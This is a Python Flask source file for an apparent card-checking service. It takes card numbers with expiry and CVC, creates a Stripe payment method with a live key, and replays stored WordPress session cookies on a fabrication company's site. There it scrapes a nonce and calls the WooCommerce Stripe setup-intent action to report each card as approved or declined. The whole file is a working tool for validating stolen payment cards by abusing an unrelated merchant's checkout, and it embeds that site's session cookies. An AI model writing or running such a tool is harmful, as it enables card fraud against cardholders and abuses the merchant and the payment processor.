from flask import Flask, request, jsonify
import time
import requests
import json

app = Flask(__name__)

def process_card(ccx):
    # Parse card details
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) < 4:
        return {
            "card": ccx,
            "gateway": "Stripe Auth", 
            "response": "Invalid card format. Use: NUMBER|MM|YY|CVC",
            "status": "Error"
        }
    
    n = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3]
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    print("\n" + "="*50)
    print(f"Processing Card: {n[:6]}XXXXXX|{mm}|{yy}|{cvc}")
    print("="*50 + "\n")
    
    # Step 1: Create payment method with Stripe
    print("[1/3] Creating payment method with Stripe API...")
    data1 = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'IN',
        'payment_user_agent': 'stripe.js/1f014c0569; stripe-js-v3/1f014c0569; payment-element; deferred-intent',
        'referrer': 'https://hakfabrications.com',
        'client_attribution_metadata[client_session_id]': 'f3fdfdb8-5a08-4cab-b0ec-fb21c130cf2a',
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'client_attribution_metadata[elements_session_config_id]': '468ab556-9fff-4f1c-8da8-c765f8c2142d',
        'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
        'guid': '2f6c56ae-bcbe-4539-b1e2-bddfc0588c067767c2',
        'muid': '47192fb7-80d2-44f0-af6e-d40688c4686a903c98',
        'sid': 'fe64dfd2-1830-4f04-9851-d729e285bc2340a6f8',
        'key': 'pk_live_51PHFfEJakExu3YjjB9200dwvfPYV3nPS2INa1tXXtAbXzIl5ArrydXgPbd8vuOhNzCrq6TrNDL2nFGyZKD23gwQV00AS39rQEH',
        '_stripe_version': '2024-06-20',
    }

    headers1 = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    try:
        response1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1)
        response_data = response1.json()
        if 'id' in response_data:
            payment_id = response_data['id']
            print(f"✓ Payment Method ID: {payment_id}")
        else:
            print("✗ Failed to create payment method:")
            error_msg = response_data.get('error', {}).get('message', 'Unknown Stripe error')
            return {
                "card": ccx,
                "gateway": "Stripe Auth",
                "response": f"Stripe Error: {error_msg}",
                "status": "Declined"
            }
    except Exception as e:
        return {
            "card": ccx,
            "gateway": "Stripe Auth",
            "response": f"Stripe API Error: {str(e)}",
            "status": "Error"
        }

    # Step 2: Get nonce from merchant site
    print("\n[2/3] Getting nonce from merchant site...")
    
    cookies0 = {
        'wordpress_sec_91ca41e7d59f3a1afa890c4675c6caa7': 'tsysgsvbsnsjsnns%7C1764850376%7ChEyDXPYvqc4S4cpT32MSxSbnSXJep74ru0mHP8bbXyE%7Cccfea4c1b8cd5a78702a80a95888f992d06e467dfd633cb075921931799ed182',
        '_ga': 'GA1.1.697081555.1747995052',
        '__stripe_mid': '47192fb7-80d2-44f0-af6e-d40688c4686a903c98',
        'tk_ai': '%2Fs0mtGqj%2FD5WJ3Utqu8HknjT',
        'tk_or': '%22%22',
        'tk_lr': '%22%22',
        '_monsterinsights_uj': '{"1747995054":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1747995105":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1747995492":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1747995525":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1747995535":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1747995718":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1747996072":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1747996078":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1747996269":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Forders%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1747996282":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1747996397":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1747996418":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1747996447":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1747996451":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1747996485":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1747996494":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1747996603":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1748003601":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1748003605":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1748502388":"https%3A%2F%2Fhakfabrications.com%2F%7C%23%7CHak%20Fabrications%20-%20Custom%20Fabrication%20%26%20Product%20Manufacturing%7C%23%7C6","1748502401":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1748502408":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1748502443":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1748502505":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1748502561":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1748503452":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1748503463":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1748503467":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201","1748503473":"https%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CMy%20account%20-%20Hak%20Fabrications%7C%23%7C201"}',
        'cookie_notice_accepted': 'false',
        'wmc_ip_info': 'eyJjb3VudHJ5IjoiSU4iLCJjdXJyZW5jeV9jb2RlIjoiSU5SIn0%3D',
        'wmc_current_currency': 'INR',
        'wmc_current_currency_old': 'INR',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2025-11-20%2011%3A33%3A51%7C%7C%7Cep%3Dhttps%3A%2F%2Fhakfabrications.com%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2025-11-20%2011%3A33%3A51%7C%7C%7Cep%3Dhttps%3A%2F%2Fhakfabrications.com%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
        '__stripe_sid': 'fe64dfd2-1830-4f04-9851-d729e285bc2340a6f8',
        '_koko_analytics_pages_viewed': 'p-e89cd67289eddaea-223e1d4f7c6630df-91768cee401814bd-87e754a3fc48237e',
        'wordpress_logged_in_91ca41e7d59f3a1afa890c4675c6caa7': 'tsysgsvbsnsjsnns%7C1764850376%7ChEyDXPYvqc4S4cpT32MSxSbnSXJep74ru0mHP8bbXyE%7Ccf5c0cea1c1956e56c6cdb1c5998f443af03e86d6b3126c3bca18addf263e267',
        'sbjs_session': 'pgs%3D17%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhakfabrications.com%2Fmy-account%2Fadd-payment-method%2F',
        '_ga_VLLDTERK51': 'GS2.1.s1763640229$o36$g1$t1763640906$j45$l0$h0',
    }

    headers0 = {
        'authority': 'hakfabrications.com',
        'accept': '*/*',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://hakfabrications.com',
        'referer': 'https://hakfabrications.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    try:
        response0 = requests.get('https://hakfabrications.com/my-account/add-payment-method/', 
                                cookies=cookies0, headers=headers0)
        # Extract nonce from the page content
        if 'createAndConfirmSetupIntentNonce' in response0.text:
            nonce = response0.text.split('createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
            print(f"✓ Nonce: {nonce}")
        else:
            return {
                "card": ccx,
                "gateway": "Stripe Auth",
                "response": "Failed to extract nonce from page",
                "status": "Error"
            }
    except Exception as e:
        return {
            "card": ccx,
            "gateway": "Stripe Auth",
            "response": f"Failed to get nonce: {str(e)}",
            "status": "Error"
        }

    # Step 3: Create and confirm setup intent
    print("\n[3/3] Creating and confirming setup intent...")
    
    data = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': payment_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }

    try:
        response = requests.post('https://hakfabrications.com/wp-admin/admin-ajax.php', 
                               cookies=cookies0, headers=headers0, data=data)
        print("\nProcessing complete.")
        
        try:
            result = response.json()
            
            # Determine status and response message
            if result.get('success') and result.get('data', {}).get('status') == 'succeeded':
                status = "Approved"
                response_msg = "Card Added"
            else:
                status = "Declined"
                # Extract error message if available
                error_data = result.get('data', {})
                if error_data.get('error'):
                    response_msg = error_data['error'].get('message', 'Card was Declined')
                else:
                    response_msg = "Card was Declined"
            
            return {
                "card": ccx,
                "gateway": "Stripe Auth",
                "response": response_msg,
                "status": status
            }
            
        except json.JSONDecodeError:
            return {
                "card": ccx,
                "gateway": "Stripe Auth",
                "response": "Gate Error - Invalid JSON response",
                "status": "Error"
            }
    except Exception as e:
        return {
            "card": ccx,
            "gateway": "Stripe Auth",
            "response": f"Final Request Error: {str(e)}",
            "status": "Error"
        }

@app.route('/process-card', methods=['POST', 'GET'])
def process_card_api():
    """
    API endpoint to process card details
    Accepts: cc parameter in format NUMBER|MM|YY|CVC
    Methods: POST (recommended) or GET
    """
    
    if request.method == 'GET':
        cc = request.args.get('cc')
    else:  # POST
        if request.is_json:
            data = request.get_json()
            cc = data.get('cc')
        else:
            cc = request.form.get('cc')
    
    if not cc:
        return jsonify({
            "card": "",
            "gateway": "Stripe Auth",
            "response": "Missing card parameter. Use 'cc' parameter with format: NUMBER|MM|YY|CVC",
            "status": "Error"
        }), 400
    
    print(f"Received card processing request: {cc[:6]}XXXXXX")
    
    # Process the card
    result = process_card(cc)
    
    return jsonify(result)

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({"status": "healthy", "service": "Card Processor API"})

@app.route('/', methods=['GET'])
def home():
    """Home endpoint with usage instructions"""
    return jsonify({
        "service": "Card Processor API",
        "endpoints": {
            "/process-card": "Process card details (POST/GET)",
            "/health": "Health check",
            "/": "This info page"
        },
        "usage": {
            "GET": "/process-card?cc=NUMBER|MM|YY|CVC",
            "POST": '{"cc": "NUMBER|MM|YY|CVC"}'
        },
        "example": {
            "card_format": "4111111111111111|12|25|123",
            "note": "Card details should be pipe-separated"
        },
        "response_format": {
            "card": "Original card string",
            "gateway": "Stripe Auth",
            "response": "Response message",
            "status": "Approved/Declined/Error"
        }
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
